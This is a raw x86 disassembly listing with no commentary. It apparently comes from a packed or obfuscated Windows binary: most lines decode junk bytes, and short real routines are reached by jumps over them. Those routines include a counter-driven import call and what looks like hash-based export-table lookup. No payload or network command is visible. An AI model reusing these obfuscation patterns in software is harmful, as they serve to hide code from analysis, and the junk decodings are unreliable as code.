  40a80c:	inc    edi
  40a80d:	mov    eax,ds:0xa6402631
  40a812:	mov    ebp,DWORD PTR [esp+esi*8-0x6a]
  40a816:	or     al,0xf5
  40a818:	ins    DWORD PTR es:[edi],dx
  40a819:	or     BYTE PTR [ecx+0xf],bh
  40a81c:	push   cs
  40a81d:	retf   0x1acb
  40a820:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a821:	fld    QWORD PTR [edi-0x7c6b203d]
  40a827:	nop
  40a828:	jp     0x40a7e3
  40a82a:	cmp    al,0x36
  40a82c:	sub    esp,DWORD PTR [eax+0x73]
  40a82f:	mov    dl,dl
  40a831:	mov    al,0xd7
  40a833:	cli    
  40a834:	pop    ss
  40a835:	pusha  
  40a836:	popa   
  40a837:	repz xchg edi,eax
  40a839:	pop    ss
  40a83a:	add    eax,0x698e6f94
  40a83f:	jecxz  0x40a88a
  40a841:	adc    BYTE PTR [ecx+0x54612c52],cl
  40a847:	push   0x2e
  40a849:	ret    
  40a84a:	xor    eax,0xbc334198
  40a84f:	nop
  40a850:	mov    dh,ch
  40a852:	pop    edx
  40a853:	pop    ss
  40a854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a855:	add    al,0xa1
  40a857:	mov    ch,0x36
  40a859:	xor    ebp,DWORD PTR [edx]
  40a85b:	inc    esi
  40a85c:	mov    ah,BYTE PTR [ebp+0x701a4d91]
  40a862:	sub    eax,0xb99056
  40a867:	rcr    DWORD PTR [ebp+0x31],0x10
  40a86b:	xlat   BYTE PTR ds:[ebx]
  40a86c:	call   0xbd938c96
  40a871:	mov    al,ds:0x4bbddc4e
  40a876:	out    0xf4,eax
  40a878:	push   es
  40a879:	mov    bl,ch
  40a87b:	fnstcw WORD PTR [eax-0x4e]
  40a87e:	jae    0x40a883
  40a880:	jno    0x40a845
  40a882:	add    DWORD PTR [eax+0xd],eax
  40a885:	ret    
  40a886:	and    ch,BYTE PTR [ecx-0x240de78]
  40a88c:	inc    ebx
  40a88d:	pushf  
  40a88e:	sub    al,cl
  40a890:	mov    ebp,0xc15ba1b4
  40a895:	(bad)  
  40a896:	dec    esp
  40a897:	mov    ah,0x9d
  40a899:	jno    0x40a8c6
  40a89b:	mov    esi,0xd01012e7
  40a8a0:	test   eax,0x5dfa03dd
  40a8a5:	scas   eax,DWORD PTR es:[edi]
  40a8a6:	cmc    
  40a8a7:	aaa    
  40a8a8:	out    0x32,al
  40a8aa:	pop    eax
  40a8ab:	es scas al,BYTE PTR es:[edi]
  40a8ad:	mov    BYTE PTR [ecx+0x30],bl
  40a8b0:	or     DWORD PTR [esi+0x7edd8915],esi
  40a8b6:	inc    ecx
  40a8b7:	pop    es
  40a8b8:	jns    0x40a8bd
  40a8ba:	mov    bl,0xe0
  40a8bc:	cdq    
  40a8bd:	mov    DWORD PTR [ebx+0x20],esi
  40a8c0:	or     bh,BYTE PTR [ecx-0x41]
  40a8c3:	seto   bl
  40a8c6:	and    BYTE PTR [ecx-0x4b],bh
  40a8c9:	inc    ecx
  40a8ca:	inc    edx
  40a8cb:	into   
  40a8cc:	in     eax,dx
  40a8cd:	push   eax
  40a8ce:	ss shl ecx,0x34
  40a8d2:	outs   dx,DWORD PTR ds:[esi]
  40a8d3:	mov    edx,0x866f063c
  40a8d8:	loop   0x40a90f
  40a8da:	fidivr DWORD PTR [ebx+edx*8-0xf4f02a2]
  40a8e1:	call   0x3bcc:0xae61b323
  40a8e8:	push   ebx
  40a8e9:	pop    esp
  40a8ea:	repnz popa 
  40a8ec:	sub    DWORD PTR [edi+0x1e991e53],eax
  40a8f2:	inc    esp
  40a8f3:	push   ecx
  40a8f4:	or     eax,0x43fd6c65
  40a8f9:	or     DWORD PTR [ebp+ecx*8+0x78610b17],esi
  40a900:	out    dx,eax
  40a901:	lods   eax,DWORD PTR ds:[esi]
  40a902:	mov    dl,0x7
  40a904:	sbb    DWORD PTR [ecx-0x3620b56f],ebx
  40a90a:	jbe    0x40a8b2
  40a90c:	jle    0x40a956
  40a90e:	jp     0x40a923
  40a910:	jmp    DWORD PTR ds:0xd084ca90
  40a916:	cdq    
  40a917:	mov    DWORD PTR [esi],esp
  40a919:	sub    ebx,ecx
  40a91b:	mov    eax,DWORD PTR [ebp-0x4]
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41abe2,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412370,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412370
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412370,ecx
  40a93f:	cmp    DWORD PTR ds:0x412370,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412370,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	push   esi
  40a9a7:	mov    dh,0x4d
  40a9a9:	sbb    al,0xe0
  40a9ab:	cmp    bh,BYTE PTR [esi+0x7e]
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40a98b
  40a9b3:	aaa    
  40a9b4:	into   
  40a9b5:	dec    ebp
  40a9b6:	add    ecx,ecx
  40a9b8:	das    
  40a9b9:	pushf  
  40a9ba:	inc    edi
  40a9bb:	lock ret 0x5699
  40a9bf:	sbb    cl,BYTE PTR [ebx+ebp*4]
  40a9c2:	scas   al,BYTE PTR es:[edi]
  40a9c3:	jecxz  0x40aa1b
  40a9c5:	push   0xffffffda
  40a9c7:	mov    eax,0x94e9c818
  40a9cc:	stc    
  40a9cd:	out    dx,al
  40a9ce:	repnz and ebx,ebx
  40a9d1:	jecxz  0x40a9a9
  40a9d3:	mov    DWORD PTR [edx],esp
  40a9d5:	or     bh,BYTE PTR [ebx+0x17]
  40a9d8:	in     al,0x82
  40a9da:	cmc    
  40a9db:	lea    esi,[eax]
  40a9dd:	xor    DWORD PTR [ebp+0x37],edi
  40a9e0:	sbb    DWORD PTR [ecx+0x67],eax
  40a9e3:	in     al,0xe4
  40a9e5:	test   eax,0xce6249f5
  40a9ea:	mov    ds:0x6eb55055,al
  40a9ef:	sub    al,0x75
  40a9f1:	pop    esi
  40a9f2:	lods   al,BYTE PTR ds:[esi]
  40a9f3:	sub    ebx,DWORD PTR [edx-0x49]
  40a9f6:	xchg   edx,eax
  40a9f7:	push   ss
  40a9f8:	iret   
  40a9f9:	mov    bl,0x4f
  40a9fb:	jg     0x40aa6b
  40a9fd:	jo     0x40aa04
  40a9ff:	jp     0x40aa3c
  40aa01:	push   esp
  40aa02:	fdivr  st(3),st
  40aa04:	icebp  
  40aa05:	pusha  
  40aa06:	pop    esp
  40aa07:	adc    eax,0xab20e353
  40aa0c:	dec    edx
  40aa0d:	sub    edx,edi
  40aa0f:	or     eax,0xe5e3c4d3
  40aa14:	sbb    dh,ah
  40aa16:	scas   al,BYTE PTR es:[edi]
  40aa17:	jecxz  0x40aa09
  40aa19:	sbb    al,0xad
  40aa1b:	fld    DWORD PTR [ebx-0xf]
  40aa1e:	(bad)  
  40aa1f:	mov    ah,0x8e
  40aa21:	scas   eax,DWORD PTR es:[edi]
  40aa22:	xor    DWORD PTR [bp-0x122d],0x2f
  40aa28:	lock stos BYTE PTR es:[edi],al
  40aa2a:	loope  0x40aa6b
  40aa2c:	mov    bl,BYTE PTR [edi]
  40aa2e:	sbb    eax,esi
  40aa30:	push   ecx
  40aa31:	cmp    bh,BYTE PTR [eax]
  40aa33:	pop    ss
  40aa34:	pop    ebp
  40aa35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa36:	xor    ch,BYTE PTR [eax-0x6c]
  40aa39:	call   0xa096b533
  40aa3e:	ret    
  40aa3f:	iret   
  40aa40:	cs pusha 
  40aa42:	push   0x47ad0f14
  40aa47:	cs add eax,0x911e9637
  40aa4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa4e:	push   es
  40aa4f:	out    0x58,al
  40aa51:	xchg   esi,eax
  40aa52:	xchg   BYTE PTR [ecx],bl
  40aa54:	adc    DWORD PTR [ecx-0x40],edi
  40aa57:	pop    esp
  40aa58:	cmc    
  40aa59:	mov    gs,ebx
  40aa5b:	mov    eax,0x749cc55f
  40aa60:	mov    ecx,0x8067bebe
  40aa65:	jo     0x40a9fb
  40aa67:	jbe    0x40aae0
  40aa69:	scas   al,BYTE PTR es:[edi]
  40aa6a:	or     eax,0xb497205
  40aa6f:	call   0x1888:0x5350dfa3
  40aa76:	push   cs
  40aa77:	icebp  
  40aa78:	(bad)  
  40aa79:	das    
  40aa7a:	idiv   BYTE PTR [ebx-0x67cc4eab]
  40aa80:	in     eax,dx
  40aa81:	dec    edi
  40aa82:	xlat   BYTE PTR ds:[ebx]
  40aa83:	sar    BYTE PTR [esi+edx*2],cl
  40aa86:	inc    ecx
  40aa87:	jo     0x40aa29
  40aa89:	inc    esp
  40aa8a:	mov    dh,0x90
  40aa8c:	aam    0xaf
  40aa8e:	inc    ebx
  40aa8f:	je     0x40aa4e
  40aa91:	neg    BYTE PTR [edi-0x39797b8a]
  40aa97:	call   0xbdd8:0xff73f73d
  40aa9e:	retf   0xe29a
  40aaa1:	js     0x40ab0c
  40aaa3:	jmp    0x9af5af60
  40aaa8:	call   0xf999:0xba280834
  40aaaf:	pop    es
  40aab0:	jmp    0xbeefff10
  40aab5:	dec    esi
  40aab6:	xor    eax,0xfe044548
  40aabb:	adc    eax,ebp
  40aabd:	fsubr  DWORD PTR ds:0xde411918
  40aac3:	dec    edx
  40aac4:	shl    DWORD PTR ds:0x3ebffbd1,1
  40aaca:	frstor [ebp+0x5b442a74]
  40aad0:	aam    0x77
  40aad2:	push   esp
  40aad3:	mov    edx,0x94dd0d0f
  40aad8:	test   eax,0xb9e7d3d7
  40aadd:	sub    DWORD PTR [ebx],esp
  40aadf:	dec    ebp
  40aae0:	icebp  
  40aae1:	imul   eax,DWORD PTR [edx-0x79],0x8adae8b4
  40aae8:	mov    BYTE PTR [eax],dl
  40aaea:	pop    edi
  40aaeb:	(bad)  
  40aaec:	mov    al,ds:0x741ff43b
  40aaf1:	scas   al,BYTE PTR es:[edi]
  40aaf2:	or     eax,ebp
  40aaf4:	sbb    BYTE PTR [edi+0x1f],dh
  40aaf7:	dec    edx
  40aaf8:	mov    ebp,DWORD PTR [ebp+0x1338486d]
  40aafe:	push   0x308c076a
  40ab03:	jno    0x40ab10
  40ab05:	adc    dh,BYTE PTR [ebx]
  40ab07:	(bad)  
  40ab08:	mov    ah,0x6d
  40ab0a:	jne    0x40ab02
  40ab0c:	adc    al,0x33
  40ab0e:	ret    0xf233
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0x4940ac8b
  40ab26:	sbb    DWORD PTR [ebx+0x4f],0xc57e7e3b
  40ab2d:	jg     0x40abad
  40ab2f:	jle    0x40ab3e
  40ab31:	dec    esi
  40ab32:	sub    DWORD PTR [edi-0x5ebdd68b],ecx
  40ab38:	add    al,0x3f
  40ab3a:	push   ebx
  40ab3b:	js     0x40ab43
  40ab3d:	popa   
  40ab3e:	sub    al,0x5a
  40ab40:	jo     0x40aba1
  40ab42:	lods   eax,DWORD PTR ds:[esi]
  40ab43:	jno    0x40ab43
  40ab45:	in     al,0x7f
  40ab47:	inc    edi
  40ab48:	xchg   edx,eax
  40ab49:	imul   eax,DWORD PTR [ebp+0x8],0x61
  40ab4d:	and    al,cl
  40ab4f:	sbb    al,0x44
  40ab51:	outs   dx,DWORD PTR ss:[esi]
  40ab53:	pop    eax
  40ab54:	loop   0x40aaf5
  40ab56:	icebp  
  40ab57:	and    DWORD PTR [esi-0x59],ecx
  40ab5a:	call   ecx
  40ab5c:	xchg   ebp,edi
  40ab5e:	jg     0x40ab89
  40ab60:	xor    ebx,DWORD PTR [esi+0x3f0781ff]
  40ab66:	outs   dx,DWORD PTR fs:[esi]
  40ab68:	(bad)  
  40ab69:	fdiv   QWORD PTR [edi+0x3a]
  40ab6c:	xor    BYTE PTR [ebx-0x38],0x87
  40ab70:	push   es
  40ab71:	adc    ebp,DWORD PTR [eax+0x0]
  40ab74:	pop    esp
  40ab75:	ds out dx,eax
  40ab77:	aam    0xa
  40ab79:	or     al,0xe0
  40ab7b:	loope  0x40aba4
  40ab7d:	pop    ecx
  40ab7e:	stos   DWORD PTR es:[edi],eax
  40ab7f:	inc    edi
  40ab80:	aaa    
  40ab81:	shl    BYTE PTR [ebp-0x6f7672cf],cl
  40ab87:	mov    dl,ah
  40ab89:	std    
  40ab8a:	xchg   esp,eax
  40ab8b:	outs   dx,DWORD PTR ds:[esi]
  40ab8c:	mov    edx,0x5e1b8e65
  40ab91:	sbb    dl,BYTE PTR [edx-0x2c]
  40ab94:	sbb    eax,0xda88223f
  40ab99:	stos   DWORD PTR es:[edi],eax
  40ab9a:	idiv   DWORD PTR [edi+0x54]
  40ab9d:	push   cs
  40ab9e:	nop
  40ab9f:	std    
  40aba0:	ror    ebp,0xa1
  40aba3:	xchg   ebx,eax
  40aba4:	sub    al,BYTE PTR [edi+0x76]
  40aba7:	mov    esp,0x67e2fe1e
  40abac:	ds fwait
  40abae:	pop    edi
  40abaf:	or     eax,0xadc862db
  40abb4:	out    0x56,eax
  40abb6:	lea    edi,[ebx+0x12]
  40abb9:	jmp    0xa5d03c4f
  40abbe:	ror    BYTE PTR ss:[esi+0x17895987],cl
  40abc5:	loope  0x40ac01
  40abc7:	repz rcr BYTE PTR [eax],0x53
  40abcb:	mov    esi,0xd00f1c11
  40abd0:	jo     0x40ac3c
  40abd2:	test   DWORD PTR [ecx],ecx
  40abd4:	icebp  
  40abd5:	repz mov ecx,0xa076a582
  40abdb:	sub    ah,BYTE PTR [ecx+0x58afcf47]
  40abe1:	scas   al,BYTE PTR es:[edi]
  40abe2:	mov    al,0x26
  40abe4:	out    0x4c,al
  40abe6:	rcr    DWORD PTR [esi+0x39],cl
  40abe9:	inc    ecx
  40abea:	jns    0x40ac4a
  40abec:	rcr    ah,1
  40abee:	bound  ebx,QWORD PTR ss:[ecx-0x613e3066]
  40abf5:	ins    DWORD PTR es:[edi],dx
  40abf6:	jmp    0xbade:0xfc53d7f2
  40abfd:	xchg   edx,eax
  40abfe:	xchg   ebp,eax
  40abff:	iret   
  40ac00:	fnsave [ebx+0x5627985]
  40ac06:	or     al,0x3f
  40ac08:	jns    0x40ac5f
  40ac0a:	scas   eax,DWORD PTR es:[edi]
  40ac0b:	pop    eax
  40ac0c:	pop    esi
  40ac0d:	xlat   BYTE PTR ds:[ebx]
  40ac0e:	gs out 0xce,al
  40ac11:	into   
  40ac12:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac13:	pop    esp
  40ac14:	test   BYTE PTR [ecx+eiz*4-0x6],bl
  40ac18:	xchg   esp,eax
  40ac19:	jmp    0xe4f0512c
  40ac1e:	mov    ds:0x81cc5cb3,al
  40ac23:	dec    ebp
  40ac24:	call   ebx
  40ac26:	stc    
  40ac27:	rol    esp,0xb4
  40ac2a:	add    BYTE PTR [ebx+edx*4-0x74],0xc3
  40ac2f:	xchg   BYTE PTR [eax-0x2c],ah
  40ac32:	xchg   esi,eax
  40ac33:	retf   0xcda0
  40ac36:	loopne 0x40ac92
  40ac38:	rol    DWORD PTR [esi-0x5e],1
  40ac3b:	xor    eax,0x34945635
  40ac40:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac41:	push   esi
  40ac42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac43:	mov    ecx,0x7d9543ef
  40ac48:	scas   al,BYTE PTR es:[edi]
  40ac49:	mov    cl,0x8d
  40ac4b:	jge    0x40ac03
  40ac4d:	gs mov ds,edx
  40ac50:	std    
  40ac51:	xchg   ebx,eax
  40ac52:	pop    ds
  40ac53:	mov    al,BYTE PTR [edx+0xa]
  40ac56:	inc    edi
  40ac57:	cmovbe eax,DWORD PTR [ecx+eiz*4+0x3c]
  40ac5c:	jbe    0x40ac2f
  40ac5e:	cs lahf 
  40ac60:	pop    es
  40ac61:	pushf  
  40ac62:	out    dx,eax
  40ac63:	mov    DWORD PTR [edi],edx
  40ac65:	sub    al,0xb2
  40ac67:	cmp    ah,0x91
  40ac6a:	rcr    DWORD PTR [ebp+0x6fae308a],1
  40ac70:	ret    
  40ac71:	push   eax
  40ac72:	xchg   esp,eax
  40ac73:	mov    ds:0x446f50b9,al
  40ac78:	and    bl,BYTE PTR [edx+0x673c68f1]
  40ac7e:	jl     0x40acf4
  40ac80:	pop    ecx
  40ac81:	je     0x40ac69
  40ac83:	in     eax,0x84
  40ac85:	cdq    
  40ac86:	xor    BYTE PTR [ebp+0x31b7082],ah
  40ac8c:	icebp  
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    esp,ebx
  40acbc:	int3   
  40acbd:	stos   DWORD PTR es:[edi],eax
  40acbe:	dec    ebx
  40acbf:	sub    bh,BYTE PTR [ecx]
  40acc1:	jle    0x40ad41
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ad41
  40acc8:	mov    edx,0xdead97e1
  40accd:	dec    eax
  40acce:	call   0x3e28caa7
  40acd3:	lea    eax,[esi-0x42]
  40acd6:	pusha  
  40acd7:	push   ss
  40acd8:	test   eax,0xba1c5686
  40acdd:	or     cl,BYTE PTR [eax-0x73]
  40ace0:	lods   eax,DWORD PTR ds:[esi]
  40ace1:	cmp    esp,DWORD PTR [esi]
  40ace3:	jne    0x40acab
  40ace5:	mov    bh,0x81
  40ace7:	jb     0x40ad4d
  40ace9:	sub    cl,BYTE PTR [ebx]
  40aceb:	int3   
  40acec:	pop    edi
  40aced:	or     esp,DWORD PTR [esp+ebp*2]
  40acf0:	and    eax,0x2a416fed
  40acf5:	mov    dh,bl
  40acf7:	pop    ds
  40acf8:	lahf   
  40acf9:	dec    eax
  40acfa:	pop    edx
  40acfb:	pop    ebx
  40acfc:	int3   
  40acfd:	rcl    esi,1
  40acff:	adc    eax,DWORD PTR [edx+esi*1]
  40ad02:	inc    esp
  40ad03:	rol    BYTE PTR [esi+esi*1+0x19],cl
  40ad07:	jg     0x40ad25
  40ad09:	push   cs
  40ad0a:	fiadd  DWORD PTR ds:0x47cd141b
  40ad10:	cmovae ecx,DWORD PTR [edx+0x5f]
  40ad14:	jne    0x40acee
  40ad16:	pop    ss
  40ad17:	mov    eax,0x8964d8c0
  40ad1c:	(bad)  
  40ad1d:	ret    
  40ad1e:	(bad)  
  40ad1f:	jmp    0x43bb:0xfbbb7179
  40ad26:	dec    ecx
  40ad27:	pop    ecx
  40ad28:	jl     0x40ace3
  40ad2a:	jge    0x40acca
  40ad2c:	mov    dh,0x8d
  40ad2e:	inc    esi
  40ad2f:	push   0x50
  40ad31:	cmp    eax,0xb4ff3ad6
  40ad36:	pushf  
  40ad37:	fdivr  DWORD PTR [edx+0x6e]
  40ad3a:	xor    bl,BYTE PTR [ebx-0x6]
  40ad3d:	outs   dx,DWORD PTR ds:[esi]
  40ad3e:	jns    0x40acc9
  40ad40:	xchg   esi,eax
  40ad41:	scas   eax,DWORD PTR es:[edi]
  40ad42:	jmp    0xf281:0x3be75baf
  40ad49:	xchg   edx,eax
  40ad4a:	das    
  40ad4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad4c:	rol    DWORD PTR [eax],1
  40ad4e:	arpl   WORD PTR [edx-0x72875f14],bp
  40ad54:	adc    DWORD PTR [ebp-0x6e],esi
  40ad57:	ret    0x2770
  40ad5a:	xor    DWORD PTR [ebx],edi
  40ad5c:	test   BYTE PTR ds:0x19a643da,dl
  40ad62:	mov    esp,0x2e70eed5
  40ad67:	jp     0x40ad95
  40ad69:	jnp    0x40ada5
  40ad6b:	mov    edi,0xa7a54f31
  40ad70:	jb     0x40acfb
  40ad72:	div    DWORD PTR [edx+0x47]
  40ad75:	sub    al,0xa5
  40ad77:	leave  
  40ad78:	jp     0x40ad62
  40ad7a:	pop    eax
  40ad7b:	jecxz  0x40adf5
  40ad7d:	mov    cl,0xae
  40ad7f:	pop    edi
  40ad80:	jbe    0x40ad7e
  40ad82:	or     BYTE PTR [ecx],0x2c
  40ad85:	push   esi
  40ad86:	jg     0x40ad8d
  40ad88:	push   cs
  40ad89:	enter  0xc325,0x5f
  40ad8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad8e:	push   edi
  40ad8f:	sti    
  40ad90:	and    BYTE PTR [eax-0x2236f121],0x43
  40ad97:	fcomp  DWORD PTR [eax]
  40ad99:	jp     0x40adb4
  40ad9b:	dec    edi
  40ad9c:	xlat   BYTE PTR ds:[ebx]
  40ad9d:	das    
  40ad9e:	xor    al,al
  40ada0:	fs cmc 
  40ada2:	jno    0x40ad55
  40ada4:	or     BYTE PTR [edx],cl
  40ada6:	and    esp,DWORD PTR [esi]
  40ada8:	(bad)  
  40ada9:	add    ebx,DWORD PTR [ebx-0x7d]
  40adac:	aaa    
  40adad:	push   ax
  40adaf:	fs xchg esi,eax
  40adb1:	ret    
  40adb2:	push   DWORD PTR [edi+ecx*8-0x44e9cd22]
  40adb9:	scas   al,BYTE PTR es:[edi]
  40adba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adbb:	dec    esi
  40adbc:	lea    ebx,[edi-0x64]
  40adbf:	mov    DWORD PTR [edx+0x652f4ded],ebp
  40adc5:	int    0xb1
  40adc7:	or     bh,BYTE PTR [esi+0x50f218f9]
  40adcd:	jmp    0xbda8ed26
  40add2:	mov    cl,0x5b
  40add4:	mov    ch,0x4d
  40add6:	sbb    esi,DWORD PTR [edi-0x71a0b8c5]
  40addc:	stc    
  40addd:	shl    DWORD PTR [eax-0x60],cl
  40ade0:	into   
  40ade1:	adc    ebx,ecx
  40ade3:	out    dx,eax
  40ade4:	loop   0x40adcb
  40ade6:	or     al,0x1e
  40ade8:	mov    WORD PTR [edx-0x6a0dbf35],es
  40adee:	mov    ds,WORD PTR [edi+ecx*1+0x7c07895c]
  40adf5:	xchg   DWORD PTR [ebp-0x2f],ecx
  40adf8:	dec    esi
  40adf9:	or     DWORD PTR [esi-0x12],ebx
  40adfc:	jg     0x40ad93
  40adfe:	sar    ecx,0x92
  40ae01:	mov    ah,0xd4
  40ae03:	shr    BYTE PTR [ebx],1
  40ae05:	pop    ss
  40ae06:	pop    es
  40ae07:	aas    
  40ae08:	shr    BYTE PTR [ebp+0x4d],1
  40ae0b:	mov    esi,0x3b82d556
  40ae10:	adc    eax,0xd599a28f
  40ae15:	test   eax,0x754519dc
  40ae1a:	or     bh,BYTE PTR [ebx+0x16]
  40ae1d:	cld    
  40ae1e:	mov    dh,0x5e
  40ae20:	cmp    eax,0xff1032d
  40ae25:	scas   eax,DWORD PTR es:[edi]
  40ae26:	(bad)  
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41abce,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41abde
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0xb9268d5d
  40ae94:	sar    BYTE PTR [ebp-0x5],cl
  40ae97:	icebp  
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	mov    eax,ds:0x11ebb7f0
  40aea4:	mov    bh,0x5c
  40aea6:	xor    eax,0x4e581fca
  40aeab:	xor    BYTE PTR [edi+0x6f3d796d],ch
  40aeb1:	pop    eax
  40aeb2:	and    al,0x3e
  40aeb4:	adc    esp,0x16d6fefa
  40aeba:	mov    esp,0x2c98316c
  40aebf:	out    0x7d,al
  40aec1:	dec    ebx
  40aec2:	sti    
  40aec3:	add    al,0x56
  40aec5:	lea    ebp,[edx]
  40aec7:	inc    ebp
  40aec8:	ins    DWORD PTR es:[edi],dx
  40aec9:	mov    dh,0x54
  40aecb:	mov    ah,0xc5
  40aecd:	rcl    BYTE PTR [eax-0x11],cl
  40aed0:	gs (bad) 
  40aed2:	out    0x43,al
  40aed4:	rcr    BYTE PTR [esi+0x2],0x79
  40aed8:	add    BYTE PTR [edx+0x21099e04],0x71
  40aedf:	push   cs
  40aee0:	(bad)  
  40aee1:	ss jbe 0x40aed3
  40aee4:	pop    esi
  40aee5:	pmulhw mm2,QWORD PTR [ebx+0x4e988620]
  40aeec:	mov    dh,0xe6
  40aeee:	or     BYTE PTR [esi+0x6ac119e8],ah
  40aef4:	mov    cl,0xc8
  40aef6:	and    al,0xb5
  40aef8:	mov    cl,0x63
  40aefa:	xor    al,0x16
  40aefc:	inc    eax
  40aefd:	cmp    BYTE PTR [edx],0xc4
  40af00:	int3   
  40af01:	jl     0x40af36
  40af03:	out    dx,al
  40af04:	xchg   edx,eax
  40af05:	loopne 0x40af52
  40af07:	add    al,0x37
  40af09:	push   ss
  40af0a:	dec    edi
  40af0b:	dec    eax
  40af0c:	pusha  
  40af0d:	fwait
  40af0e:	shl    bh,1
  40af10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af11:	das    
  40af12:	xchg   DWORD PTR [edx-0x6f],ecx
  40af15:	lea    esi,[eax]
  40af17:	rcl    DWORD PTR [eax],cl
  40af19:	cmp    edx,DWORD PTR ss:[ecx+0x52]
  40af1d:	je     0x40af98
  40af1f:	adc    al,0x88
  40af21:	out    0x2e,al
  40af23:	movaps XMMWORD PTR [ebp+eax*1+0x16],xmm7
  40af28:	fdiv   DWORD PTR ds:[edx]
  40af2b:	mov    cl,0xd7
  40af2d:	aam    0xb5
  40af2f:	mov    eax,0x964ce5e5
  40af34:	dec    ecx
  40af35:	jl     0x40af48
  40af37:	pop    ds
  40af38:	mov    eax,0x77afb802
  40af3d:	xor    DWORD PTR [eax],esi
  40af3f:	cmp    esi,ebp
  40af41:	jp     0x40aecc
  40af43:	nop
  40af44:	int3   
  40af45:	xchg   edx,eax
  40af46:	fmul   st,st(1)
  40af48:	repz push esp
  40af4a:	push   esp
  40af4b:	push   cs
  40af4c:	scas   al,BYTE PTR es:[edi]
  40af4d:	push   eax
  40af4e:	xor    BYTE PTR [ebp-0x552151b7],0xc0
  40af55:	mov    eax,0xdb9f3a48
  40af5a:	test   eax,0x14f51475
  40af5f:	out    dx,al
  40af60:	adc    DWORD PTR [ebx-0x76],edi
  40af63:	loope  0x40af91
  40af65:	push   edi
  40af66:	in     al,dx
  40af67:	mov    ebx,0x32729f
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412370,0x41abce
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x41235c,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41abe6,0x41235c
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41510d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
